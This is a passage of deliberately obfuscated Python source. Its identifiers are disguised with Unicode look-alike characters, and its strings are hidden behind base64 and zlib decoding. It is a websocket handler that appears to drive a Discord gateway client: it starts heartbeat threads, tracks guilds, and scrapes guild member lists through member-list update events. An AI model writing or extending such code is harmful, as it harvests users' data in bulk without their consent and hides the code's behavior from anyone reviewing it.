0j))]).b64decode(__𝙞𝗺𝙥𝙤𝗿𝘵__(𝘭𝗠𝗜𝘐𝙈𝘭𝙈𝙉𝗜𝘐𝘕𝙈𝗹𝘭𝗜𝙈𝙡𝗠𝘭𝗜𝘔𝗜𝙈𝘐𝗡𝘔𝘐𝗹𝗹𝗹𝗡𝗹[𝙧𝙤𝘂𝗻𝗱(𝘢𝙗𝙨(0.2103937586282172 + 0.9776167277263066j))]).decompress(b'x\xdaK\x0b\xb4\xb5\x05\x00\x03F\x012')).decode())
                𝙩𝙞𝙢𝘦.sleep(𝙞𝘯𝘁𝗲𝘳𝘃𝗮𝙡)
        except 𝗘𝘅𝗰𝙚𝗽𝘁𝗶𝘰𝙣 as e:
            pass
            return

    def sock_message(self, ws, message):
        𝙙𝗲𝘤𝗼𝙙𝙚𝘥 = 𝘫𝙨𝗼𝗻.loads(𝗺𝗲𝘀𝘀𝘢𝘨𝘦)
        if 𝙙𝘦𝗰𝗼𝘥𝘦𝙙 is None:
            return
        if 𝗱𝘦𝙘𝘰𝗱𝙚𝙙[__𝘪𝙢𝘱𝘰𝙧𝙩__(𝘭𝘔𝗜𝗜𝙈𝗹𝗠𝗡𝘐𝘐𝗡𝘔𝘭𝙡𝙄𝗠𝗹𝗠𝙡𝙄𝙈𝗜𝙈𝙄𝙉𝗠𝙄𝙡𝙡𝙡𝗡𝙡[𝙧𝘰𝙪𝙣𝘥(𝗮𝙗𝘴(0.0 + 0j))]).b64decode(__𝗶𝗺𝘱𝙤𝗿𝙩__(𝘭𝘔𝘐𝙄𝗠𝗹𝗠𝙉𝗜𝗜𝗡𝗠𝘭𝙡𝘐𝙈𝙡𝘔𝘭𝙄𝙈𝗜𝗠𝘐𝙉𝘔𝘐𝙡𝘭𝘭𝘕𝙡[𝘳𝗼𝙪𝗻𝗱(𝙖𝘣𝘴(0.5639899809224467 + 0.8257816305895271j))]).decompress(b'x\xdaK2v\xb4\x05\x00\x02\xe4\x01\x14')).decode()] != 𝘳𝙤𝙪𝙣𝙙(𝘢𝙗𝘀(3.3905301309906104 + 10.46443048764933j)):
            𝙨𝘦𝙡𝘧.packets_recv += 𝘳𝗼𝘶𝘯𝘥(𝘢𝘣𝘴(0.7560295357060359 + 0.654537501706446j))
        if 𝙙𝙚𝙘𝘰𝙙𝙚𝙙[__𝘪𝗺𝘱𝘰𝙧𝘵__(𝙡𝙈𝙄𝙄𝘔𝗹𝘔𝙉𝙄𝘐𝗡𝙈𝗹𝗹𝗜𝗠𝗹𝙈𝘭𝙄𝘔𝘐𝘔𝘐𝙉𝗠𝗜𝙡𝙡𝗹𝘕𝗹[𝗿𝘰𝘂𝗻𝘥(𝘢𝘣𝘀(0.0 + 0j))]).b64decode(__𝙞𝙢𝗽𝘰𝙧𝘵__(𝘭𝘔𝙄𝙄𝗠𝘭𝙈𝗡𝙄𝗜𝗡𝗠𝘭𝘭𝙄𝙈𝙡𝘔𝗹𝙄𝘔𝗜𝗠𝙄𝙉𝘔𝘐𝗹𝙡𝙡𝗡𝙡[𝘳𝘰𝙪𝘯𝘥(𝗮𝘣𝘴(0.5378465338012126 + 0.843042766458512j))]).decompress(b'x\xdaK2v\xb4\x05\x00\x02\xe4\x01\x14')).decode()] == 𝙧𝘰𝙪𝗻𝘥(𝘢𝙗𝘀(5.966108017007798 + 8.025307167292432j)):
            𝘵𝘩𝘳𝘦𝘢𝗱𝙞𝘯𝘨.Thread(target=𝘴𝗲𝙡𝘧.heartbeatThread, args=(𝙙𝙚𝗰𝙤𝘥𝘦𝘥[__𝘪𝘮𝗽𝙤𝘳𝘁__(𝗹𝘔𝘐𝘐𝗠𝗹𝗠𝘕𝘐𝙄𝘕𝙈𝙡𝙡𝙄𝗠𝘭𝘔𝘭𝙄𝘔𝙄𝗠𝙄𝙉𝙈𝗜𝙡𝘭𝙡𝗡𝘭[𝗿𝘰𝘶𝘯𝘥(𝘢𝘣𝘴(0.0 + 0j))]).b64decode(__𝗶𝘮𝗽𝗼𝙧𝘵__(𝘭𝙈𝗜𝗜𝗠𝘭𝘔𝙉𝗜𝘐𝘕𝗠𝙡𝗹𝘐𝘔𝗹𝗠𝙡𝗜𝙈𝘐𝗠𝙄𝘕𝙈𝘐𝙡𝘭𝘭𝗡𝗹[𝘳𝗼𝘂𝙣𝗱(𝘢𝙗𝘴(0.427343772344681 + 0.9040892103317114j))]).decompress(b'x\xda\x8br\xb4\xb5\x05\x00\x02\xe6\x01\x16')).decode()][__𝙞𝗺𝘱𝘰𝗿𝘵__(𝗹𝙈𝗜𝘐𝘔𝘭𝘔𝘕𝘐𝘐𝙉𝗠𝗹𝘭𝘐𝘔𝘭𝗠𝘭𝘐𝗠𝙄𝙈𝘐𝗡𝙈𝙄𝘭𝘭𝙡𝘕𝗹[𝘳𝙤𝙪𝗻𝘥(𝗮𝘣𝘀(0.0 + 0j))]).b64decode(__𝗶𝙢𝘱𝙤𝗿𝙩__(𝗹𝘔𝙄𝘐𝗠𝙡𝗠𝙉𝘐𝙄𝙉𝗠𝘭𝗹𝘐𝘔𝗹𝙈𝘭𝘐𝘔𝗜𝗠𝘐𝘕𝘔𝙄𝘭𝙡𝗹𝗡𝙡[𝘳𝘰𝘶𝗻𝙙(𝘢𝙗𝘀(0.13350989745445807 + 0.9910474798321723j))]).decompress(b'x\xdaKt\x0f\xcbH\xce\x0b\xca\x8c\nw3\x880\xca)Mq\x0f\xabL\xc9u+\x06\x00i\x00\x08\x89')).decode()] / 𝗿𝗼𝘶𝗻𝘥(𝘢𝗯𝙨(405.5949901330291 + 914.0528999893759j)),), daemon=True).start()
        if 𝗱𝗲𝙘𝙤𝘥𝘦𝘥[__𝗶𝗺𝙥𝗼𝙧𝘁__(𝘭𝘔𝗜𝙄𝗠𝙡𝗠𝗡𝘐𝗜𝙉𝙈𝗹𝗹𝗜𝘔𝗹𝗠𝗹𝙄𝗠𝗜𝙈𝘐𝗡𝘔𝘐𝙡𝗹𝙡𝙉𝘭[𝗿𝗼𝘂𝙣𝘥(𝘢𝙗𝙨(0.0 + 0j))]).b64decode(__𝘪𝘮𝗽𝙤𝙧𝘁__(𝘭𝘔𝙄𝙄𝙈𝘭𝙈𝘕𝘐𝘐𝗡𝙈𝗹𝗹𝙄𝘔𝙡𝙈𝗹𝘐𝙈𝙄𝘔𝘐𝗡𝙈𝗜𝘭𝙡𝗹𝙉𝘭[𝗿𝙤𝘂𝘯𝙙(𝗮𝙗𝙨(0.12532902017119663 + 0.9921152335807206j))]).decompress(b'x\xdaKq\xb4\xb5\x05\x00\x03\x0e\x01 ')).decode()] == __𝙞𝙢𝙥𝘰𝘳𝘵__(𝗹𝙈𝗜𝘐𝙈𝙡𝗠𝙉𝗜𝘐𝗡𝗠𝘭𝘭𝗜𝙈𝘭𝗠𝙡𝗜𝘔𝘐𝙈𝗜𝗡𝙈𝘐𝗹𝗹𝘭𝘕𝙡[𝙧𝘰𝙪𝗻𝘥(𝗮𝗯𝙨(0.0 + 0j))]).b64decode(__𝙞𝗺𝗽𝙤𝘳𝘵__(𝙡𝙈𝙄𝘐𝘔𝗹𝗠𝙉𝙄𝙄𝗡𝗠𝗹𝗹𝙄𝙈𝘭𝘔𝘭𝘐𝘔𝗜𝘔𝗜𝗡𝙈𝗜𝙡𝙡𝘭𝘕𝗹[𝗿𝗼𝘂𝗻𝘥(𝙖𝙗𝘀(0.9714031713877902 + 0.23743605163863282j))]).decompress(b'x\xda\x0b\xcd\x0es\nr\xcb\xb6\x05\x00\x0c\x18\x02\x99')).decode():
            for 𝘨𝘶𝙞𝘭𝗱 in 𝗱𝗲𝘤𝘰𝗱𝘦𝙙[__𝙞𝘮𝘱𝘰𝙧𝙩__(𝙡𝙈𝙄𝘐𝘔𝙡𝘔𝙉𝘐𝗜𝙉𝘔𝙡𝗹𝘐𝘔𝘭𝘔𝗹𝙄𝗠𝘐𝘔𝙄𝘕𝗠𝙄𝗹𝘭𝘭𝘕𝗹[𝘳𝘰𝘂𝘯𝗱(𝘢𝗯𝘀(0.0 + 0j))]).b64decode(__𝘪𝙢𝘱𝘰𝗿𝘵__(𝘭𝘔𝘐𝗜𝙈𝗹𝗠𝙉𝙄𝙄𝗡𝙈𝙡𝘭𝘐𝙈𝙡𝘔𝘭𝙄𝙈𝙄𝘔𝘐𝘕𝘔𝘐𝗹𝘭𝙡𝗡𝙡[𝘳𝘰𝘂𝙣𝘥(𝗮𝗯𝘀(0.5988900964240131 + 0.8008312259179435j))]).decompress(b'x\xda\x8br\xb4\xb5\x05\x00\x02\xe6\x01\x16')).decode()][__𝘪𝘮𝙥𝘰𝙧𝙩__(𝗹𝙈𝙄𝗜𝘔𝙡𝗠𝙉𝘐𝘐𝗡𝘔𝘭𝘭𝙄𝙈𝘭𝙈𝙡𝘐𝘔𝗜𝙈𝗜𝙉𝘔𝙄𝗹𝙡𝙡𝘕𝗹[𝘳𝘰𝘶𝙣𝗱(𝘢𝘣𝘀(0.0 + 0j))]).b64decode(__𝘪𝘮𝗽𝗼𝗿𝙩__(𝙡𝙈𝘐𝙄𝗠𝗹𝗠𝙉𝘐𝙄𝘕𝗠𝙡𝘭𝗜𝗠𝘭𝗠𝗹𝘐𝙈𝗜𝗠𝗜𝙉𝘔𝘐𝙡𝙡𝗹𝙉𝗹[𝗿𝗼𝘶𝘯𝗱(𝙖𝙗𝘴(0.879199882614889 + 0.4764531104001372j))]).decompress(b'x\xda\x8b2\x0e+Hr\x0f\xaa\x02\x00\x0b\xec\x02\xc9')).decode()]:
                𝙨𝘦𝘭𝙛.guilds[𝗴𝙪𝙞𝘭𝘥[__𝘪𝗺𝘱𝘰𝙧𝘵__(𝗹𝗠𝙄𝘐𝙈𝙡𝙈𝘕𝗜𝙄𝘕𝙈𝘭𝙡𝙄𝗠𝗹𝙈𝗹𝙄𝗠𝗜𝗠𝘐𝗡𝗠𝙄𝙡𝗹𝗹𝙉𝘭[𝙧𝙤𝙪𝗻𝘥(𝘢𝙗𝙨(0.0 + 0j))]).b64decode(__𝙞𝙢𝗽𝗼𝘳𝘁__(𝙡𝘔𝗜𝘐𝘔𝙡𝗠𝗡𝗜𝙄𝘕𝘔𝘭𝙡𝙄𝙈𝘭𝗠𝙡𝘐𝘔𝘐𝘔𝘐𝘕𝗠𝘐𝗹𝙡𝗹𝙉𝙡[𝗿𝘰𝙪𝙣𝙙(𝙖𝘣𝘴(0.9357631225747864 + 0.3526292364922188j))]).decompress(b'x\xdaK\x0c\x0f\xb4\x05\x00\x03l\x01G')).decode()]] = {__𝗶𝙢𝙥𝙤𝗿𝘁__(𝗹𝙈𝗜𝗜𝗠𝙡𝗠𝘕𝗜𝘐𝗡𝘔𝙡𝗹𝘐𝘔𝘭𝙈𝘭𝘐𝗠𝙄𝙈𝗜𝙉𝘔𝙄𝘭𝘭𝗹𝘕𝘭[𝙧𝙤𝙪𝗻𝗱(𝙖𝗯𝘀(0.0 + 0j))]).b64decode(__𝙞𝗺𝘱𝘰𝘳𝘵__(𝗹𝘔𝘐𝗜𝗠𝗹𝘔𝘕𝙄𝘐𝗡𝘔𝗹𝙡𝘐𝗠𝗹𝘔𝙡𝘐𝗠𝘐𝙈𝘐𝙉𝘔𝘐𝗹𝘭𝘭𝘕𝘭[𝘳𝙤𝙪𝗻𝙙(𝘢𝘣𝘀(0.7051230887137135 + 0.7090849242247592j))]).decompress(b'x\xdaK\n\x0f+\x89\xcc\r\xab\x8c0\xf2+K\t75\x00\x001\xc8\x05\x87')).decode(): 𝘨𝘂𝘪𝙡𝘥[__𝗶𝗺𝗽𝙤𝗿𝘁__(𝘭𝘔𝙄𝗜𝘔𝙡𝗠𝘕𝗜𝘐𝘕𝘔𝗹𝙡𝙄𝙈𝙡𝗠𝘭𝘐𝙈𝘐𝗠𝗜𝗡𝙈𝗜𝘭𝙡𝗹𝗡𝗹[𝙧𝙤𝙪𝘯𝗱(𝙖𝘣𝘀(0.0 + 0j))]).b64decode(__𝙞𝗺𝙥𝙤𝗿𝙩__(𝙡𝗠𝘐𝘐𝙈𝙡𝘔𝙉𝘐𝘐𝘕𝗠𝙡𝗹𝙄𝘔𝘭𝙈𝗹𝗜𝗠𝘐𝘔𝗜𝗡𝘔𝘐𝗹𝗹𝗹𝘕𝘭[𝗿𝙤𝘂𝙣𝙙(𝘢𝙗𝙨(0.665554337270229 + 0.7463493981646842j))]).decompress(b'x\xdaK\n\x0f+\x89\xcc\r\xab\x8c0\xf2+K\t75\x00\x001\xc8\x05\x87')).decode()]}
        if 𝗱𝘦𝘤𝙤𝘥𝘦𝙙[__𝗶𝙢𝘱𝗼𝙧𝘁__(𝘭𝗠𝘐𝙄𝙈𝙡𝙈𝗡𝗜𝘐𝗡𝘔𝙡𝗹𝘐𝘔𝙡𝙈𝘭𝙄𝗠𝙄𝗠𝗜𝘕𝙈𝗜𝙡𝘭𝙡𝗡𝙡[𝘳𝗼𝘂𝘯𝘥(𝗮𝙗𝙨(0.0 + 0j))]).b64decode(__𝙞𝗺𝘱𝗼𝙧𝙩__(𝗹𝘔𝙄𝘐𝗠𝘭𝗠𝗡𝗜𝘐𝗡𝘔𝙡𝗹𝘐𝙈𝗹𝙈𝗹𝙄𝘔𝙄𝗠𝗜𝙉𝗠𝘐𝗹𝗹𝗹𝘕𝗹[𝗿𝗼𝙪𝗻𝙙(𝙖𝗯𝙨(0.5526541003766221 + 0.8334107302746387j))]).decompress(b'x\xdaKq\xb4\xb5\x05\x00\x03\x0e\x01 ')).decode()] == __𝗶𝗺𝗽𝗼𝙧𝘁__(𝙡𝙈𝗜𝙄𝘔𝘭𝘔𝘕𝗜𝙄𝗡𝗠𝘭𝗹𝙄𝙈𝘭𝗠𝙡𝙄𝙈𝙄𝙈𝗜𝘕𝙈𝙄𝙡𝗹𝘭𝘕𝙡[𝗿𝘰𝘶𝗻𝗱(𝙖𝘣𝙨(0.0 + 0j))]).b64decode(__𝘪𝘮𝙥𝙤𝙧𝘵__(𝘭𝗠𝙄𝘐𝘔𝗹𝗠𝘕𝗜𝘐𝗡𝗠𝙡𝙡𝗜𝘔𝘭𝙈𝘭𝗜𝙈𝗜𝙈𝗜𝘕𝙈𝙄𝙡𝗹𝙡𝗡𝗹[𝙧𝗼𝙪𝘯𝙙(𝘢𝘣𝘴(0.7498891427349578 + 0.6615635068594928j))]).decompress(b'x\xda\x0b\xcd\x0es\nr\xcbI\x0b5\x0c\x0b\x0cu\xadp\x0b\t\r\xf3\x0fsu\xf3\x05\x00c\x0e\x07\xc4')).decode():
            𝘴𝙚𝙩𝘢𝘁𝘵𝘳(𝙨𝗲𝙡𝗳, 'ranges', 𝙐𝙩𝘪𝗹𝘴.getRanges(𝙧𝘰𝙪𝙣𝘥(𝗮𝘣𝘀(0.0 + 0j)), 𝘳𝘰𝙪𝘯𝙙(𝗮𝗯𝙨(13.145714920189654 + 99.13218538515683j)), 𝘀𝙚𝘭𝗳.guilds[𝙨𝘦𝙡𝘧.guild_id][__𝙞𝘮𝙥𝘰𝗿𝙩__(𝙡𝙈𝗜𝙄𝘔𝘭𝙈𝘕𝙄𝗜𝙉𝙈𝗹𝗹𝗜𝗠𝗹𝙈𝘭𝗜𝗠𝘐𝗠𝘐𝘕𝙈𝙄𝗹𝘭𝗹𝙉𝗹[𝙧𝘰𝘂𝘯𝙙(𝘢𝙗𝙨(0.0 + 0j))]).b64decode(__𝙞𝙢𝘱𝗼𝗿𝘁__(𝙡𝘔𝙄𝘐𝗠𝗹𝘔𝗡𝘐𝗜𝘕𝘔𝗹𝘭𝗜𝙈𝘭𝘔𝙡𝘐𝗠𝗜𝙈𝗜𝗡𝙈𝗜𝙡𝙡𝘭𝘕𝗹[𝗿𝘰𝙪𝙣𝘥(𝙖𝗯𝘀(0.16024973237806095 + 0.9870765032522858j))]).decompress(b'x\xdaK\n\x0f+\x89\xcc\r\xab\x8c0\xf2+K\t75\x00\x001\xc8\x05\x87')).decode()]))
            𝘴𝙚𝙡𝘧.scrapeUsers()
        elif 𝘥𝘦𝙘𝗼𝘥𝘦𝙙[__𝗶𝗺𝙥𝗼𝗿𝘁__(𝗹𝗠𝗜𝗜𝙈𝘭𝘔𝗡𝙄𝙄𝗡𝘔𝗹𝘭𝗜𝗠𝗹𝘔𝘭𝗜𝘔𝗜𝙈𝙄𝙉𝙈𝘐𝙡𝘭𝘭𝙉𝙡[𝘳𝘰𝘶𝙣𝙙(𝙖𝘣𝘴(0.0 + 0j))]).b64decode(__𝘪𝘮𝗽𝗼𝙧𝘁__(𝘭𝙈𝙄𝘐𝗠𝙡𝗠𝘕𝘐𝘐𝙉𝘔𝗹𝙡𝗜𝗠𝗹𝗠𝗹𝘐𝙈𝘐𝗠𝙄𝗡𝘔𝘐𝘭𝗹𝘭𝘕𝗹[𝙧𝗼𝘂𝗻𝘥(𝗮𝙗𝙨(0.6179475609621273 + 0.7862193153954932j))]).decompress(b'x\xdaKq\xb4\xb5\x05\x00\x03\x0e\x01 ')).decode()] == __𝗶𝘮𝙥𝗼𝙧𝘵__(𝗹𝗠𝙄𝗜𝙈𝘭𝘔𝘕𝗜𝗜𝙉𝗠𝘭𝗹𝗜𝗠𝙡𝙈𝘭𝗜𝙈𝙄𝙈𝗜𝗡𝙈𝗜𝙡𝙡𝘭𝙉𝗹[𝗿𝘰𝘶𝗻𝘥(𝙖𝘣𝘴(0.0 + 0j))]).b64decode(__𝘪𝗺𝙥𝗼𝘳𝘵__(𝙡𝙈𝙄𝘐𝙈𝗹𝘔𝙉𝗜𝙄𝙉𝘔𝙡𝘭𝘐𝗠𝙡𝗠𝘭𝘐𝗠𝗜𝗠𝘐𝘕𝙈𝘐𝘭𝘭𝘭𝙉𝘭[𝘳𝘰𝘂𝙣𝘥(𝘢𝙗𝘀(0.615511589348003 + 0.788127834414123j))]).decompress(b'x\xda\x0b2\x0c\xf3\nq\rJ\x0b\t\r\xf3\x0b\xcc\x0e\x0b\x8e0\xa8\xf0\n5\x0cJ\x0b\x0bsr\r\x0c\x0br\x03\x00\xa7I\n!')).decode():
            𝗽𝙖𝗿𝘴𝙚𝘥 = 𝙐𝘁𝙞𝗹𝘀.parseGuildMemberListUpdate(𝗱𝗲𝘤𝙤𝘥𝙚𝗱)
            if 𝘱𝙖𝗿𝘀𝙚𝗱[__𝘪𝙢𝘱𝘰𝘳𝘵__(𝙡𝗠𝗜𝘐𝙈𝘭𝙈𝗡𝘐𝙄𝙉𝘔𝙡𝙡𝙄𝗠𝙡𝘔𝗹𝙄𝗠𝗜𝗠𝘐𝙉𝗠𝘐𝘭𝙡𝘭𝗡𝘭[𝙧𝙤𝙪𝗻𝘥(𝘢𝘣𝙨(0.0 + 0j))]).b64decode(__𝘪𝙢𝙥𝘰𝙧𝘁__(𝗹𝘔𝘐𝗜𝘔𝘭𝗠𝙉𝗜𝗜𝙉𝙈𝘭𝗹𝙄𝙈𝙡𝙈𝗹𝗜𝗠𝙄𝗠𝗜𝗡𝘔𝗜𝗹𝗹𝙡𝙉𝙡[𝘳𝘰𝘶𝘯𝗱(𝘢𝗯𝙨(0.7201444103563588 + 0.6938242055683069j))]).decompress(b'x\xda\x8b2\x0e+Hr\x0fJK\x0c\x0f\xb4\x05\x00\x1a\x14\x03\xfb')).decode()] == 𝘀𝘦𝘭𝗳.guild_id and (__𝙞𝘮𝘱𝗼𝙧𝘁__(𝙡𝙈𝘐𝘐𝙈𝘭𝗠𝗡𝗜𝙄𝙉𝘔𝙡𝗹𝗜𝙈𝗹𝗠𝘭𝙄𝗠𝙄𝘔𝗜𝗡𝗠𝘐𝙡𝙡𝗹𝘕𝗹[𝘳𝗼𝘂𝙣𝗱(𝘢𝘣𝘀(0.0 + 0j))]).b64decode(__𝗶𝙢𝗽𝗼𝙧𝘵__(𝘭𝘔𝘐𝙄𝙈𝙡𝗠𝘕𝙄𝗜𝘕𝘔𝙡𝙡𝘐𝙈𝗹𝗠𝙡𝙄𝙈𝗜𝘔𝘐𝙉𝗠𝙄𝘭𝙡𝙡𝘕𝗹[𝘳𝗼𝙪𝗻𝘥(𝘢𝙗𝘀(0.8606521564662645 + 0.5091933479239183j))]).decompress(b'x\xda\x0b5\xcc\xf1\x0f,\xb7\xb5\x05\x00\x0bz\x02\x84')).decode() in 𝙥𝙖𝙧𝘴𝙚𝗱[__𝙞𝘮𝘱𝘰𝙧𝙩__(𝘭𝘔𝘐𝘐𝗠𝘭𝘔𝘕𝙄𝗜𝗡𝙈𝘭𝗹𝗜𝙈𝘭𝗠𝙡𝙄𝙈𝘐𝙈𝘐𝙉𝗠𝘐𝙡𝘭𝗹𝘕𝘭[𝙧𝙤𝙪𝘯𝙙(𝘢𝙗𝙨(0.0 + 0j))]).b64decode(__𝗶𝙢𝘱𝘰𝙧𝘁__(𝗹𝘔𝘐𝗜𝘔𝘭𝙈𝙉𝙄𝘐𝙉𝗠𝙡𝙡𝙄𝘔𝗹𝘔𝙡𝗜𝗠𝘐𝗠𝙄𝙉𝘔𝙄𝙡𝘭𝘭𝗡𝘭[𝘳𝗼𝙪𝙣𝗱(𝘢𝗯𝙨(0.8009827773220712 + 0.5986873895727396j))]).decompress(b'x\xdaK\xf1\xc8)\x8f\x8a\xf0\xb5\x05\x00\rB\x02\xcc')).decode()] or __𝘪𝙢𝘱𝘰𝙧𝘁__(𝗹𝗠𝘐𝗜𝙈𝘭𝗠𝗡𝘐𝙄𝘕𝗠𝘭𝘭𝙄𝗠𝙡𝗠𝘭𝘐𝗠𝗜𝙈𝙄𝘕𝘔𝘐𝙡𝗹𝘭𝙉𝗹[𝗿𝗼𝘂𝘯𝙙(𝗮𝗯𝘀(0.0 + 0j))]).b64decode(__𝘪𝘮𝙥𝙤𝙧𝘁__(𝗹𝙈𝙄𝘐𝘔𝙡𝙈𝙉𝘐𝗜𝘕𝗠𝘭𝙡𝙄𝘔𝙡𝘔𝗹𝘐𝗠𝘐𝘔𝗜𝘕𝙈𝗜𝙡𝙡𝗹𝘕𝙡[𝘳𝘰𝙪𝘯𝘥(𝙖𝘣𝘴(0.7088107054301006 + 0.7053987410448669j))]).decompress(b"x\xda\x0b\x0bsr\r\x0c\x0br\x03\x00\x0b'\x02s")).decode() in 𝙥𝘢𝙧𝘀𝙚𝘥[__𝘪𝗺𝗽𝙤𝗿𝘵__(𝘭𝗠𝗜𝘐𝙈𝙡𝗠𝘕𝙄𝘐𝗡𝘔𝘭𝘭𝙄𝙈𝙡𝘔𝘭𝗜𝙈𝘐𝘔𝙄𝘕𝘔𝘐𝗹𝘭𝗹𝗡𝘭[𝘳𝘰𝙪𝙣𝙙(𝗮𝗯𝘴(0.0 + 0j))]).b64decode(__𝘪𝗺𝘱𝗼𝗿𝘵__(𝘭𝘔𝗜𝙄𝙈𝗹𝘔𝙉𝗜𝗜𝗡𝗠𝗹𝗹𝙄𝘔𝗹𝘔𝙡𝘐𝘔𝘐𝘔𝘐𝗡𝘔𝙄𝘭𝘭𝘭𝗡𝙡[𝗿𝘰𝘂𝘯𝗱(𝙖𝙗𝙨(0.16231556004414527 + 0.986738901111918j))]).decompress(b'x\xdaK\xf1\xc8)\x8f\x8a\xf0\xb5\x05\x00\rB\x02\xcc')).decode()]):
                for 𝗲𝘭𝘦𝘮, 𝗶𝙣𝙙𝘦𝘹 in 𝙚𝗻𝙪𝙢𝗲𝗿𝗮𝘵𝗲(𝗽𝗮𝗿𝙨𝙚𝙙[__𝘪𝗺𝙥𝗼𝙧𝙩__(𝙡𝘔𝘐𝘐𝘔𝗹𝘔𝘕𝘐𝙄𝗡𝘔𝗹𝗹𝘐𝙈𝘭𝘔𝗹𝙄𝙈𝗜𝗠𝙄𝘕𝙈𝗜𝙡𝘭𝗹𝗡𝗹[𝙧𝘰𝘂𝙣𝘥(𝘢𝗯𝘴(0.0 + 0j))]).b64decode(__𝙞𝙢𝗽𝘰𝘳𝘁__(𝗹𝗠𝗜𝗜𝙈𝙡𝘔𝗡𝗜𝗜𝗡𝙈𝙡𝗹𝗜𝙈𝙡𝙈𝘭𝘐𝘔𝘐𝗠𝙄𝗡𝘔𝗜𝙡𝘭𝘭𝙉𝙡[𝙧𝗼𝙪𝗻𝗱(𝘢𝗯𝘴(0.909039325522796 + 0.4167103366285268j))]).decompress(b'x\xdaK\xf1\xc8)\x8f\x8a\xf0\xb5\x05\x00\rB\x02\xcc')).decode()]):
                    if 𝘪𝗻𝘥𝗲𝙭 == __𝗶𝗺𝗽𝗼𝗿𝘵__(𝙡𝘔𝗜𝙄𝘔𝗹𝙈𝘕𝙄𝗜𝗡𝙈𝙡𝙡𝙄𝗠𝘭𝘔𝗹𝘐𝘔𝙄𝗠𝗜𝗡𝙈𝗜𝙡𝘭𝘭𝘕𝗹[𝗿𝗼𝘂𝘯𝗱(𝗮𝘣𝘴(0.0 + 0j))]).b64decode(__𝘪𝗺𝙥𝗼𝙧𝘁__(𝙡𝗠𝗜𝘐𝗠𝘭𝙈𝗡𝘐𝙄𝘕𝘔𝘭𝗹𝗜𝘔𝘭𝘔𝗹𝗜𝘔𝘐𝙈𝘐𝘕𝙈𝘐𝗹𝙡𝗹𝙉𝗹[𝘳𝘰𝘶𝘯𝘥(𝗮𝗯𝘴(0.30201144357508103 + 0.9533042997646112j))]).decompress(b'x\xda\x0b5\xcc\xf1\x0f,\xb7\xb5\x05\x00\x0bz\x02\x84')).decode():
                        if 𝙡𝗲𝗻(𝗽𝗮𝙧𝙨𝗲𝗱[__𝗶𝗺𝗽𝘰𝙧𝘵__(𝙡𝙈𝙄𝗜𝗠𝘭𝙈𝗡𝘐𝙄𝙉𝗠𝙡𝘭𝙄𝘔𝗹𝙈𝗹𝗜𝗠𝗜𝘔𝗜𝙉𝘔𝙄𝗹𝘭𝘭𝙉𝗹[𝗿𝗼𝙪𝙣𝙙(𝘢𝙗𝙨(0.0 + 0j))]).b64decode(__𝙞𝘮𝘱𝘰𝙧𝘵__(𝙡𝗠𝙄𝙄𝗠𝘭𝗠𝙉𝘐𝘐𝗡𝙈𝙡𝗹𝗜𝘔𝘭𝙈𝗹𝗜𝙈𝗜𝘔𝙄𝙉𝗠𝗜𝘭𝘭𝙡𝙉𝘭[𝗿𝗼𝘶𝙣𝘥(𝘢𝘣𝙨(0.9800960026253068 + 0.19852411852944865j))]).decompress(b'x\xdaK\x89p\xca\x8e\x8c\x08\xcaI.\xb7\xb5\x05\x00\x1b\xbb\x04-')).decode()][𝘦𝙡𝙚𝙢]) == 𝗿𝗼𝘂𝘯𝗱(𝘢𝗯𝘴(0.0 + 0j)):
                            𝘴𝘦𝘵𝙖𝘵𝙩𝙧(𝙨𝘦𝗹𝘧, 'endScraping', True)
                            break
                        for 𝙞𝘵𝗲𝙢 in 𝗽𝗮𝘳𝘴𝘦𝘥[__𝗶𝘮𝘱𝙤𝗿𝘁__(𝗹𝘔𝙄𝘐𝙈𝘭𝙈𝗡𝙄𝘐𝗡𝘔𝙡𝗹𝙄𝙈𝘭𝘔𝘭𝗜𝙈𝘐𝗠𝘐𝗡𝘔𝘐𝘭𝗹𝙡𝙉𝙡[𝗿𝗼𝘂𝗻𝙙(𝘢𝗯𝙨(0.0 + 0j))]).b64decode(__𝗶𝙢𝘱𝙤𝗿𝘵__(𝙡𝙈𝗜𝗜𝙈𝘭𝗠𝗡𝗜𝙄𝙉𝘔𝗹𝗹𝗜𝙈𝘭𝗠𝙡𝘐𝗠𝘐𝙈𝘐𝘕𝗠𝙄𝙡𝙡𝗹𝗡𝗹[𝗿𝗼𝘂𝘯𝗱(𝘢𝗯𝘴(0.2826093156531374 + 0.9592350987667545j))]).decompress(b'x\xdaK\x89p\xca\x8e\x8c\x08\xcaI.\xb7\xb5\x05\x00\x1b\xbb\x04-')).decode()][𝙚𝘭𝘦𝗺]:
                            if __𝗶𝗺𝘱𝘰𝗿𝘵__(𝗹𝗠𝘐𝗜𝙈𝙡𝗠𝗡𝙄𝘐𝘕𝘔𝘭𝘭𝙄𝗠𝙡𝗠𝙡𝙄𝗠𝘐𝗠𝙄𝙉𝘔𝘐𝗹𝘭𝘭𝗡𝗹[𝙧𝙤𝙪𝙣𝘥(𝗮𝘣𝘴(0.0 + 0j))]).b64decode(__𝙞𝘮𝗽𝘰𝘳𝙩__(𝗹𝗠𝘐𝙄𝗠𝗹𝘔𝘕𝙄𝙄𝗡𝗠𝙡𝘭𝘐𝙈𝗹𝙈𝙡𝘐𝙈𝘐𝙈𝗜𝘕𝙈𝙄𝘭𝙡𝗹𝘕𝗹[𝗿𝙤𝘂𝙣𝗱(𝘢𝗯𝘴(0.8776496741917712 + 0.4793026699185786j))]).decompress(b'x\xdaK\n\x0f+\x89\xcc\r\xab\x04\x00\r\x91\x03\x19')).decode() in 𝙞𝘵𝗲𝘮:
                                𝗺𝙚𝗺 = 𝗶𝘁𝙚𝙢[__𝗶𝙢𝘱𝗼𝙧𝘵__(𝙡𝙈𝙄𝗜𝗠𝗹𝗠𝘕𝗜𝙄𝙉𝘔𝗹𝘭𝗜𝙈𝘭𝙈𝘭𝘐𝗠𝘐𝙈𝘐𝗡𝘔𝗜𝘭𝘭𝗹𝙉𝙡[𝘳𝙤𝙪𝙣𝙙(𝘢𝘣𝙨(0.0 + 0j))]).b64decode(__𝘪𝗺𝘱𝗼𝙧𝙩__(𝗹𝙈𝘐𝘐𝘔𝙡𝙈𝙉𝙄𝙄𝙉𝗠𝙡𝘭𝘐𝘔𝗹𝙈𝘭𝘐𝗠𝗜𝘔𝗜𝗡𝗠𝗜𝗹𝗹𝙡𝘕𝘭[𝗿𝘰𝘶𝗻𝘥(𝗮𝗯𝘴(0.5812160767756314 + 0.8137492685695904j))]).decompress(b'x\xdaK\n\x0f+\x89\xcc\r\xab\x04\x00\r\x91\x03\x19')).decode()]
